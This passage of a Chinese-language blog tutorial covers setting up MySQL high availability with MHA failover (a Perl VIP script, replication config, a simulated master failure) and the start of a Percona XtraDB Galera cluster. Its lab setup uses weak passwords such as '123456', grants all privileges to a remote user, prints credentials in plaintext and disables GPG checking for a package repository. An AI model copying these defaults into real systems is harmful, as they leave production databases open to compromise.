    <span class="hljs-built_in">exit</span> <span class="hljs-variable">$exit_code</span>;<br>    &#125;<br>    <span class="hljs-built_in">exit</span> <span class="hljs-variable">$exit_code</span>;<br>  &#125;<br>    elsif ( <span class="hljs-variable">$command</span> eq <span class="hljs-string">&quot;start&quot;</span> ) &#123;<br><br>        <span class="hljs-comment"># all arguments are passed.</span><br>        <span class="hljs-comment"># If you manage master ip address at global catalog database,</span><br>        <span class="hljs-comment"># activate new_master_ip here.</span><br>        <span class="hljs-comment"># You can also grant write access (create user, set read_only=0, etc) here.</span><br>        my <span class="hljs-variable">$exit_code</span> = 10;<br>        <span class="hljs-built_in">eval</span> &#123;<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Enabling the VIP - <span class="hljs-variable">$vip</span> on the new master - <span class="hljs-variable">$new_master_host</span> \n&quot;</span>;<br>            &amp;start_vip();<br>            &amp;stop_vip();<br>            <span class="hljs-variable">$exit_code</span> = 0;<br>        &#125;;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$@</span>) &#123;<br>            warn <span class="hljs-variable">$@</span>;<br>            <span class="hljs-built_in">exit</span> <span class="hljs-variable">$exit_code</span>;<br>        &#125;<br>        <span class="hljs-built_in">exit</span> <span class="hljs-variable">$exit_code</span>;<br>    &#125;<br>    elsif ( <span class="hljs-variable">$command</span> eq <span class="hljs-string">&quot;status&quot;</span> ) &#123;<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Checking the Status of the script.. OK \n&quot;</span>;<br>        `ssh <span class="hljs-variable">$ssh_user</span>\@<span class="hljs-variable">$orig_master_host</span> \&quot; <span class="hljs-variable">$ssh_start_vip</span> \&quot;`;<br>        <span class="hljs-built_in">exit</span> 0;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        &amp;usage();<br>        <span class="hljs-built_in">exit</span> 1;<br>    &#125;<br>&#125;<br><br><br>sub <span class="hljs-function"><span class="hljs-title">start_vip</span></span>() &#123;<br>    `ssh <span class="hljs-variable">$ssh_user</span>\@<span class="hljs-variable">$new_master_host</span> \&quot; <span class="hljs-variable">$ssh_start_vip</span> \&quot;`;<br>&#125;<br><span class="hljs-comment"># A simple system call that disable the VIP on the old_master</span><br>sub <span class="hljs-function"><span class="hljs-title">stop_vip</span></span>() &#123;<br>   `ssh <span class="hljs-variable">$ssh_user</span>\@<span class="hljs-variable">$orig_master_host</span> \&quot; <span class="hljs-variable">$ssh_stop_vip</span> \&quot;`;<br>&#125;<br><br><br>sub usage &#123;<br>  <span class="hljs-built_in">print</span><br><span class="hljs-string">&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="（6）实现master"><a href="#（6）实现master" class="headerlink" title="（6）实现master"></a>（6）实现master</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master ~]<span class="hljs-comment"># yum install -y mysql-server</span><br>[root@master ~]<span class="hljs-comment"># mkdir -p /data/mysql</span><br>[root@master ~]<span class="hljs-comment"># chown mysql.mysql /data/mysql/</span><br><br>[root@master ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysqld]<br>server-id=8<br>log-bin=/data/mysql/mysql-bin  <span class="hljs-comment">#指定二进制日志存放的目录,mha4mysql-manager-0.58必须指定（需要和/etc/mastermha/app1.cnf内的一致）</span><br>skip_name_resolve=1 <span class="hljs-comment">#禁止反向解析</span><br>general_log <span class="hljs-comment">#观察结果,非必须项,生产无需启用</span><br><br>[root@master ~]<span class="hljs-comment"># systemctl enable --now mysqld</span><br><br><span class="hljs-comment">#因为是新安装的机器，所以不需要完全备份。</span><br><span class="hljs-comment">#在未进行任何操作前记录下值（这样slvae会master同步下面两个授权账号）</span><br>[root@master ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; show master logs;<br>+------------------+-----------+-----------+<br>| Log_name         | File_size | Encrypted |<br>+------------------+-----------+-----------+<br>| mysql-bin.000001 |       179 | No        |<br>| mysql-bin.000002 |       156 | No        |<br>+------------------+-----------+-----------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#如果是MySQL8.0执行下面操操作</span><br>mysql&gt; create user repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt; grant replication slave on *.* to repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>mysql&gt; create user mhauser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt; grant all on *.* to mhauser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><br><span class="hljs-comment">#如果是MySQL8.0以前版本执行下面操操作</span><br>mysql&gt;grant replication slave on *.* to repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt;grant all on *.* to mhauser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br><span class="hljs-comment">#配置VIP</span><br><span class="hljs-comment">#此IP为master_ip_failover脚本里面的变量</span><br><span class="hljs-comment">#第一次需要手动添加（且别名为eth0:1）</span><br><span class="hljs-comment">#如果主节点down掉，那么此IP会自动转移到从节点上</span><br>[root@MHA ~]<span class="hljs-comment"># cat /usr/local/bin/master_ip_failover |grep &quot;^my&quot;</span><br>my <span class="hljs-variable">$vip</span> = <span class="hljs-string">&#x27;10.0.0.100/24&#x27;</span>;<br>my <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>my <span class="hljs-variable">$ssh_start_vip</span> = <span class="hljs-string">&quot;/sbin/ifconfig eth0:<span class="hljs-variable">$key</span> <span class="hljs-variable">$vip</span>&quot;</span>;<br>my <span class="hljs-variable">$ssh_stop_vip</span> = <span class="hljs-string">&quot;/sbin/ifconfig eth0:<span class="hljs-variable">$key</span> down&quot;</span>;<br>[root@master ~]<span class="hljs-comment"># ifconfig eth0:1 10.0.0.100/24</span><br></code></pre></td></tr></table></figure><h5 id="（7）实现-slave"><a href="#（7）实现-slave" class="headerlink" title="（7）实现****slave"></a>（7）<strong>实现****slave</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下面只演示slvae1操作过程，slave2也需操作</span><br><span class="hljs-comment">#slave1和slave2除server-id需不一致外其他操作相同</span><br>[root@slave1 ~]<span class="hljs-comment"># yum install -y mysql-server</span><br>[root@slave1 ~]<span class="hljs-comment"># mkdir -p /data/mysql</span><br>[root@slave1 ~]<span class="hljs-comment"># chown mysql.mysql /data/mysql/</span><br><br>[root@slave1 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysqld]<br>server-id=18 <span class="hljs-comment">#不同节点此值各不相同</span><br>log-bin=/data/mysql/mysql-bin  <span class="hljs-comment">#指定二进制日志存放的目录,mha4mysql-manager-0.58必须指定（需要和/etc/mastermha/app1.cnf内的一致）</span><br>read-only<br>relay-log-purge=0<br>skip-name-resolve=1 <span class="hljs-comment">#禁止反向解析</span><br>general_log <span class="hljs-comment">#观察结果,非必须项,生产无需启用</span><br><br>[root@slave1 ~]<span class="hljs-comment"># systemctl enable --now mysqld</span><br><br>[root@slave1 ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; CHANGE MASTER TO<br>         MASTER_HOST=<span class="hljs-string">&#x27;10.0.0.8&#x27;</span>,<br>         MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>,<br>         MASTER_PASSWORD=<span class="hljs-string">&#x27;123456&#x27;</span>,<br>         MASTER_PORT=3306,<br>         MASTER_LOG_FILE=<span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>,<br>         MASTER_LOG_POS=156,<br>         MASTER_CONNECT_RETRY=3;<br>mysql&gt; start slave;<br></code></pre></td></tr></table></figure><h5 id="（8）检查MHA的环境"><a href="#（8）检查MHA的环境" class="headerlink" title="（8）检查MHA的环境"></a>（8）检查MHA的环境</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#检查环境</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_check_ssh --conf=/etc/mastermha/app1.cnf</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_check_repl --conf=/etc/mastermha/app1.cnf</span><br><br><span class="hljs-comment">#查看状态</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_check_status --conf=/etc/mastermha/app1.cnf</span><br></code></pre></td></tr></table></figure><h5 id="（9）启动MHA"><a href="#（9）启动MHA" class="headerlink" title="（9）启动MHA"></a>（9）启动MHA</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启MHA,默认是前台运行,生产环境一般为后台执行</span><br>[root@MHA ~]<span class="hljs-comment"># nohup masterha_manager --conf=/etc/mastermha/app1.cnf --remove_dead_master_conf --ignore_last_failover &amp;&gt; /dev/null </span><br><span class="hljs-comment">#测试环境</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_manager --conf=/etc/mastermha/app1.cnf --remove_dead_master_conf --ignore_last_failover</span><br><br><span class="hljs-comment">#如果想停止后台执行的MHA,可以执行下面命令</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_stop --conf=/etc/mastermha/app1.cnf </span><br>Stopped app1 successfully.<br><br><span class="hljs-comment">#查看状态</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_check_status --conf=/etc/mastermha/app1.cnf</span><br></code></pre></td></tr></table></figure><h5 id="（10）排错日志"><a href="#（10）排错日志" class="headerlink" title="（10）排错日志"></a>（10）排错日志</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@MHA ~]<span class="hljs-comment"># tail /data/mastermha/app1/manager.log</span><br><br><span class="hljs-comment">#健康性检查</span><br>[root@master ~]<span class="hljs-comment"># tail -f /var/lib/mysql/master.log</span><br>2022-11-03T17:41:32.075497Z   22 QuerySELECT 1 As Value<br>2022-11-03T17:41:33.074744Z   22 QuerySELECT 1 As Value<br>2022-11-03T17:41:34.076151Z   22 QuerySELECT 1 As Value<br></code></pre></td></tr></table></figure><h5 id="（11）模拟故障"><a href="#（11）模拟故障" class="headerlink" title="（11）模拟故障"></a>（11）模拟故障</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#模拟故障</span><br>[root@master ~]<span class="hljs-comment"># systemctl stop mysqld</span><br><span class="hljs-comment">#当 master down机后,mha管理程序自动退出</span><br>[root@MHA ~]<span class="hljs-comment"># masterha_manager --conf=/etc/mastermha/app1.cnf --remove_dead_master_conf --ignore_last_</span><br>Fri Nov  4 09:39:37 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Sk<br>Fri Nov  4 09:39:37 2022 - [info] Reading application default configuration from /etc/mastermha/app1.c<br>Fri Nov  4 09:39:37 2022 - [info] Reading server configuration from /etc/mastermha/app1.cnf..<br><br>  Creating /data/mastermha/app1 <span class="hljs-keyword">if</span> not exists..    ok.<br>  Checking output directory is accessible or not..<br>   ok.<br>  Binlog found at /data/mysql/, up to mysql-bin.000003<br>Fri Nov  4 09:45:55 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Sk<br>Fri Nov  4 09:45:55 2022 - [info] Reading application default configuration from /etc/mastermha/app1.c<br>Fri Nov  4 09:45:55 2022 - [info] Reading server configuration from /etc/mastermha/app1.cnf..<br><br><span class="hljs-comment">#验证VIP漂移至新的Master上</span><br>[root@slave1 ~]<span class="hljs-comment"># ifconfig eth0:1</span><br>eth0:1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 10.0.0.100  netmask 255.255.255.0  broadcast 10.0.0.255<br>        ether 00:0c:29:34:3d:e8  txqueuelen 1000  (Ethernet)<br><br><span class="hljs-comment">#自动修改manager节点上的配置文件,将master剔除</span><br>[root@slave1 ~]<span class="hljs-comment"># cat /etc/mastermha/app1.cnf</span><br>[server2]<br>hostname=10.0.0.18<br>port=3306<br>candidate_master=1<br>[server3]<br>hostname=10.0.0.28<br>port=3306<br></code></pre></td></tr></table></figure><p><strong>收到报警邮件</strong></p><p><a href="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221104015036118-1429453128.png"><img src="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221104015036118-1429453128.png" alt="img"></a></p><h5 id="（12）修复主从"><a href="#（12）修复主从" class="headerlink" title="（12）修复主从"></a>（12）修复主从</h5><blockquote><ul><li>修复故障的主库,保证数据同步</li><li>修复主从,手工新故障库加入新的主,设为为从库</li><li>修复manager的配置文件</li><li>清理相关目录</li><li>检查ssh互信和replication的复制是否成功</li><li>检查VIP,如果有问题,重新配置VIP</li><li>重新运行MHA,查询MHA状态,确保运行正常</li></ul></blockquote><h5 id="（13）如果再次运行MHA-需要先删除下面文件"><a href="#（13）如果再次运行MHA-需要先删除下面文件" class="headerlink" title="（13）如果再次运行MHA,需要先删除下面文件"></a><strong>（13）如果再次运行MHA,需要先删除下面文件</strong></h5><blockquote><p> MHA只能漂移一次，如果多次使用必须删除以下文件，要不MHA不可重用</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@MHA ~]<span class="hljs-comment"># rm -rf /data/mastermha/app1/              #mha_master自己的工作路径</span><br>[root@MHA ~]<span class="hljs-comment"># rm -rf /data/mastermha/app1/manager.log   #mha_master自己的日志文件</span><br>[root@master ~]<span class="hljs-comment">#rm -rf /data/mastermha/app1/            #每个远程主机即三个节点的的工作目录</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-2-Galera-Cluster"><a href="#3-2-Galera-Cluster" class="headerlink" title="3.2 Galera Cluster"></a>3.2 Galera Cluster</h3><blockquote><p>Galera Cluster：集成了Galera插件的MySQL集群，是一种新型的，数据不共享的，高度冗余的高可用方案，目前Galera Cluster有两个版本，分别是<strong>Percona Xtradb Cluster</strong>及<strong>MariaDB Cluster</strong>，Galera本身是具有多主特性的，即采用multi-master的集群架构，是一个既稳健，又在数据一致性、完整性及高性能方面有出色表现的高可用解决方案</p><p><strong>特点</strong></p><ul><li>多主架构：真正的多点读写的集群，在任何时候读写数据，都是最新的</li><li>同步复制：改善了主从复制延迟问题，基本上达到了实时同步</li><li>并发复制：从节点APPLY数据时，支持并行执行，更好的性能</li><li>故障切换：在出现数据库故障时，因支持多点写入，切换容易</li></ul></blockquote><h4 id="实战案例：Percona-XtraDB-Cluster-PXC-5-7）"><a href="#实战案例：Percona-XtraDB-Cluster-PXC-5-7）" class="headerlink" title="实战案例：Percona XtraDB Cluster(PXC 5.7）"></a>实战案例：Percona XtraDB Cluster(PXC 5.7）</h4><blockquote><p><strong>环境准备</strong></p><p>四台主机：</p><ul><li>pxc1:10.0.0.7</li><li>pxc2:10.0.0.17</li><li>pxc3:10.0.0.27</li><li>pxc4:10.0.0.37</li><li>第4台模拟生产中后续增加的节点</li></ul><p><strong>OS</strong> <strong>版本目前不支持****CentOS 8</strong></p><ul><li>关闭防火墙和SELinux</li><li>保证时间同步</li></ul><p>注意：如果已经安装MySQL，必须卸载</p></blockquote><h5 id="（1）安装-Percona-XtraDB-Cluster-5-7"><a href="#（1）安装-Percona-XtraDB-Cluster-5-7" class="headerlink" title="（1）安装 Percona XtraDB Cluster 5.7"></a>（1）安装 Percona XtraDB Cluster 5.7</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#此处使用清华大学yum源，官方源太慢了</span><br>[root@pxc1 ~]<span class="hljs-comment">#vim /etc/yum.repos.d/pxc.repo</span><br>[percona]<br>name=percona_repo<br>baseurl=https://mirrors.tuna.tsinghua.edu.cn/percona/release/<span class="hljs-variable">$releasever</span>/RPMS/<span class="hljs-variable">$basearch</span><br>enabled=1<br>gpgcheck=0<br><br>[root@pxc1 ~]<span class="hljs-comment">#scp /etc/yum.repos.d/pxc.repo 10.0.0.17:/etc/yum.repos.d</span><br>[root@pxc1 ~]<span class="hljs-comment">#scp /etc/yum.repos.d/pxc.repo 10.0.0.27:/etc/yum.repos.d</span><br><span class="hljs-comment">#在三个节点都安装好PXC 5.7 </span><br>[root@pxc1 ~]<span class="hljs-comment">#yum install Percona-XtraDB-Cluster-57 -y</span><br>[root@pxc2 ~]<span class="hljs-comment">#yum install Percona-XtraDB-Cluster-57 -y</span><br>[root@pxc3 ~]<span class="hljs-comment">#yum install Percona-XtraDB-Cluster-57 -y</span><br></code></pre></td></tr></table></figure><h5 id="（2）在各个节点上分别配置mysql及集群配置文件"><a href="#（2）在各个节点上分别配置mysql及集群配置文件" class="headerlink" title="（2）在各个节点上分别配置mysql及集群配置文件"></a>（2）在各个节点上分别配置mysql及集群配置文件</h5><blockquote><p>/etc/my.cnf为主配置文件，当前版本中，其余的配置文件都放在/etc/percona-xtradb-cluster.conf.d目录里，包括下面三个文件</p><ul><li>mysqld.cnf</li><li>mysqld_safe.cnf</li><li>wsrep.cnf</li></ul><p>注意：尽管Galera Cluster不再需要通过binlog的形式进行同步，但还是建议在配置文件中开启二进制日志功能，原因是后期如果有新节点需要加入，老节点通过SST全量传输的方式向新节点传输数据，很可能会拖垮集群性能，所以让新节点先通过binlog方式完成同步后再加入集群会是一种更好的选择</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@pxc1 ~]<span class="hljs-comment">#ls /etc/percona-xtradb-cluster.conf.d/</span><br>mysqld.cnf mysqld_safe.cnf wsrep.cnf<br><span class="hljs-comment">#下面配置文件不需要修改</span><br>[root@pxc1 ~]<span class="hljs-comment">#cat /etc/percona-xtradb-cluster.conf.d/mysqld.cnf </span><br>...省略...<br>[client]<br>socket=/var/lib/mysql/mysql.sock<br>[mysqld]<br>server-id=1     <span class="hljs-comment">#建议各个节点不同</span><br>datadir=/var/lib/mysql<br>socket=/var/lib/mysql/mysql.sock<br>log-error=/var/log/mysqld.log<br>pid-file=/var/run/mysqld/mysqld.pid<br>log-bin     <span class="hljs-comment">#建议启用，非必须项</span><br>log_slave_updates<br>expire_logs_days=7<br><br><span class="hljs-comment">#PXC的配置文件必须修改</span><br>[root@pxc1 ~]<span class="hljs-comment">#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf </span><br>[root@pxc1 ~]<span class="hljs-comment">#grep -Ev &quot;^#|^$&quot; /etc/percona-xtradb-cluster.conf.d/wsrep.cnf </span><br>[mysqld]<br>wsrep_provider=/usr/lib64/galera3/libgalera_smm.so<br>wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27 <span class="hljs-comment">#三个节点的IP</span><br>binlog_format=ROW<br>default_storage_engine=InnoDB<br>wsrep_slave_threads= 8<br>wsrep_log_conflicts<br>innodb_autoinc_lock_mode=2<br>wsrep_node_address=10.0.0.7 <span class="hljs-comment">#各个节点，指定自已的IP</span><br>wsrep_cluster_name=pxc-cluster<br>wsrep_node_name=pxc-cluster-node-1 <span class="hljs-comment">#各个节点，指定自已节点名称</span><br>pxc_strict_mode=ENFORCING<br>wsrep_sst_method=xtrabackup-v2<br>wsrep_sst_auth=<span class="hljs-string">&quot;sstuser:s3cretPass&quot;</span> <span class="hljs-comment">#取消本行注释,同一集群内多个节点的验证用户和密码信息必须一致</span><br><br>[root@pxc2 ~]<span class="hljs-comment">#grep -Ev &quot;^#|^$&quot; /etc/percona-xtradb-cluster.conf.d/wsrep.cnf </span><br>[mysqld]<br>wsrep_provider=/usr/lib64/galera3/libgalera_smm.so<br>wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27<br>binlog_format=ROW<br>default_storage_engine=InnoDB<br>wsrep_slave_threads= 8<br>wsrep_log_conflicts<br>innodb_autoinc_lock_mode=2          <br>wsrep_node_address=10.0.0.17 <span class="hljs-comment">#各个节点，指定自已的IP</span><br>wsrep_cluster_name=pxc-cluster<br>wsrep_node_name=pxc-cluster-node-2 <span class="hljs-comment">#各个节点，指定自已节点名称</span><br>pxc_strict_mode=ENFORCING<br>wsrep_sst_method=xtrabackup-v2<br>wsrep_sst_auth=<span class="hljs-string">&quot;sstuser:s3cretPass&quot;</span> <span class="hljs-comment">#取消本行注释</span><br><br>[root@pxc3 ~]<span class="hljs-comment">#grep -Ev &quot;^#|^$&quot; /etc/percona-xtradb-cluster.conf.d/wsrep.cnf </span><br>[mysqld]<br>wsrep_provider=/usr/lib64/galera3/libgalera_smm.so<br>wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27<br>binlog_format=ROW<br>default_storage_engine=InnoDB<br>wsrep_slave_threads= 8<br>wsrep_log_conflicts<br>innodb_autoinc_lock_mode=2   <br>wsrep_node_address=10.0.0.27 <span class="hljs-comment">#各个节点，指定自已的IP</span><br>wsrep_cluster_name=pxc-cluster<br>wsrep_node_name=pxc-cluster-node-3 <span class="hljs-comment">#各个节点，指定自已的IP</span><br>pxc_strict_mode=ENFORCING<br>wsrep_sst_method=xtrabackup-v2<br>wsrep_sst_auth=<span class="hljs-string">&quot;sstuser:s3cretPass&quot;</span>  <span class="hljs-comment">#取消本行注释</span><br></code></pre></td></tr></table></figure><h5 id="（3）启动PXC集群中第一个节点"><a href="#（3）启动PXC集群中第一个节点" class="headerlink" title="（3）启动PXC集群中第一个节点"></a>（3）启动PXC集群中第一个节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@pxc1 ~]<span class="hljs-comment">#systemctl start mysql@bootstrap.service</span><br>[root@pxc1 ~]<span class="hljs-comment">#ss -ntul</span><br>State       Recv-Q Send-Q             Local Address:Port                            Peer Address:Port                          <br>LISTEN      0      128                            *:4567                                       *:*                  <br>LISTEN      0      80                            :::3306                                      :::* <br><br><span class="hljs-comment">#查看root密码</span><br>[root@pxc1 ~]<span class="hljs-comment">#grep &quot;password&quot; /var/log/mysqld.log          </span><br>2022-11-04T19:30:20.592377Z 1 [Note] A temporary password is generated <span class="hljs-keyword">for</span> root@localhost: mNZTH2o*4Use<br>[root@pxc1 ~]<span class="hljs-comment">#mysql -uroot -p&#x27;=mNZTH2o*4Use&#x27;</span><br><span class="hljs-comment">#修改root密码</span><br>mysql&gt; alter user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-comment">#创建相关用户并授权（下面所赋予的权限是官方文档里面提供的）</span><br>mysql&gt; CREATE USER <span class="hljs-string">&#x27;sstuser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;s3cretPass&#x27;</span>;<br>mysql&gt; GRANT RELOAD, LOCK TABLES, PROCESS, REPLICATION CLIENT ON *.* TO <span class="hljs-string">&#x27;sstuser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br><br><span class="hljs-comment">#查看相关变量</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;wsrep%&#x27;</span>\G<br><span class="hljs-comment">#查看相关状态变量</span><br>mysql&gt; SHOW STATUS LIKE <span class="hljs-string">&#x27;wsrep%&#x27;</span>\G<br></code></pre></td></tr></table></figure><h5 id="（5）启动PXC集群中其它所有节点"><a href="#（5）启动PXC集群中其它所有节点" class="headerlink" title="（5）启动PXC集群中其它所有节点"></a>（5）启动PXC集群中其它所有节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@pxc2 ~]<span class="hljs-comment">#systemctl start mysql</span><br></code></pre></td></tr></table></figure><h5 id="（6）查看集群状态，验证集群是否成功"><a href="#（6）查看集群状态，验证集群是否成功" class="headerlink" title="（6）查看集群状态，验证集群是否成功"></a>（6）查看集群状态，验证集群是否成功</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 